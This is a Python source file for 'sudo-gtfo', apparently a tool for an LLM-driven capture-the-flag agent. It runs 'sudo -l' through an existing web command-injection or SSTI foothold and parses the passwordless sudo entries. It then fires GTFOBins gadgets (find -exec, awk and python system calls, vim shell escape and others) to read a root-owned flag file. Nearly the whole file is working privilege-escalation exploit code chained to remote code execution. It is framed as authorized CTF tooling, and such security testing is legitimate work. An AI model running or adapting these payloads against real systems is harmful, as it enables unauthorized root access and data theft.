#!/usr/bin/env python3
"""Deterministic sudo-GTFOBins privesc helper (`sudo-gtfo`).

The LLM reliably gets a foothold but UNreliably lands the privesc last mile: when a flag is
root-owned it must run `sudo -l` through the foothold, spot a NOPASSWD binary, and abuse it via
GTFOBins — and it often wanders into re-enumeration instead. This closes that deterministically, the
same way web-rce closed payload encoding: run `sudo -l` through the existing web foothold, parse the
NOPASSWD binaries, and for each known GTFOBins gadget run the root-read of the target flag — all in
one invocation. Shells out to the already-deployed `web-rce` so it works through SSTI/cmd-injection.

  sudo-gtfo --url http://t/ping --param host --method POST --mode cmdi --flag /root/flag.txt

The parsing + payload builders are pure and unit-tested; only the web-rce calls are I/O. Within
grin's posture: it reads the authorized flag, runs through the same in-scope foothold, no new vector."""
import argparse
import os
import subprocess
import sys

# GTFOBins sudo gadgets: binary basename -> a function building a shell command that reads `flag`
# AS ROOT via `sudo <binary>`. Only read-oriented gadgets (no interactive shells needed).
_GADGETS = {
    "find": lambda b, f: f"sudo {b} {f} -exec cat {{}} \\;",
    "awk":  lambda b, f: f"sudo {b} 'BEGIN{{system(\"cat {f}\")}}'",
    "gawk": lambda b, f: f"sudo {b} 'BEGIN{{system(\"cat {f}\")}}'",
    "python":  lambda b, f: f"sudo {b} -c 'import os;os.system(\"cat {f}\")'",
    "python3": lambda b, f: f"sudo {b} -c 'import os;os.system(\"cat {f}\")'",
    "perl": lambda b, f: f"sudo {b} -e 'system(\"cat {f}\")'",
    "vim":  lambda b, f: f"sudo {b} -c ':!cat {f}' -c ':q!' /dev/null",
    "vi":   lambda b, f: f"sudo {b} -c ':!cat {f}' -c ':q!' /dev/null",
    "nano": lambda b, f: f"sudo {b} {f}",            # prints file content to the (non-tty) output
    "less": lambda b, f: f"sudo {b} {f}",
    "more": lambda b, f: f"sudo {b} {f}",
    "cat":  lambda b, f: f"sudo {b} {f}",
    "env":  lambda b, f: f"sudo {b} cat {f}",
    "sed":  lambda b, f: f"sudo {b} -n p {f}",
    "tail": lambda b, f: f"sudo {b} -n+1 {f}",
    "head": lambda b, f: f"sudo {b} -n-1 {f}",
}


def parse_nopasswd(sudo_l_output: str) -> list:
    """Binaries the current user may run as root WITHOUT a password, from `sudo -l` output. Returns
    ['ALL'] for total `(ALL) NOPASSWD: ALL` ownage. Entries that need a password are skipped. Pure."""
    out = []
    for line in (sudo_l_output or "").splitlines():
        s = line.strip()
        if "NOPASSWD:" not in s:
            continue
        rhs = s.split("NOPASSWD:", 1)[1].strip()
        for item in rhs.split(","):
            tok = item.strip().split()[0] if item.strip() else ""
            if tok == "ALL":
                return ["ALL"]
            if tok.startswith("/"):
                out.append(tok)
    return out


def gtfo_read(binary: str, flag: str) -> str | None:
    """A shell command that reads `flag` as root via `sudo <binary>`, or None if the binary isn't a
    known GTFOBins read gadget. 'ALL' -> a plain `sudo cat`. Matches on basename so /bin/x and
    /usr/bin/x are equivalent. Pure."""
    if binary == "ALL":
        return f"sudo cat {flag}"
    base = os.path.basename(binary)
    g = _GADGETS.get(base)
    return g(binary, flag) if g else None


# ---------------------------------------------------------------------------
# Runner (I/O) — drive the privesc through the deployed web-rce foothold
# ---------------------------------------------------------------------------

def _web_rce(url, param, method, mode, cmd, timeout=40) -> str:
    try:
        r = subprocess.run(
            ["web-rce", "--url", url, "--param", param, "--method", method, "--mode", mode,
             "--cmd", cmd],
            capture_output=True, text=True, timeout=timeout)
        return (r.stdout or "") + (r.stderr or "")
    except Exception as e:  # noqa: BLE001
        return f"[sudo-gtfo web-rce error: {e}]"


def run(url, param, method, mode, flag) -> str:
    sudo_l = _web_rce(url, param, method, mode, "sudo -l 2>&1")
    bins = parse_nopasswd(sudo_l)
    if not bins:
        return f"[sudo-gtfo: no NOPASSWD sudo rights found]\n{sudo_l[:400]}"
    tried = []
    for b in bins:
        cmd = gtfo_read(b, flag)
        if cmd is None:
            tried.append(f"{b} (no gadget)")
            continue
        out = _web_rce(url, param, method, mode, cmd)
        if "GRIN{" in out or out.strip():
            if "GRIN{" in out:
                start = out.find("GRIN{")
                return out[start:out.find("}", start) + 1]
            return out.strip()
        tried.append(b)
    return f"[sudo-gtfo: NOPASSWD bins found ({', '.join(bins)}) but none yielded the flag; tried {tried}]"


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(prog="sudo-gtfo",
                                 description="Deterministic sudo-NOPASSWD GTFOBins privesc via a web foothold")
    ap.add_argument("--url", required=True)
    ap.add_argument("--param", default="host")
    ap.add_argument("--method", choices=["GET", "POST"], default="POST")
    ap.add_argument("--mode", choices=["ssti", "cmdi", "auto"], default="auto")
    ap.add_argument("--flag", default="/root/flag.txt", help="root-owned file to read")
    a = ap.parse_args(argv)
    print(run(a.url, a.param, a.method, a.mode, a.flag))
    return 0


if __name__ == "__main__":
    sys.exit(main())
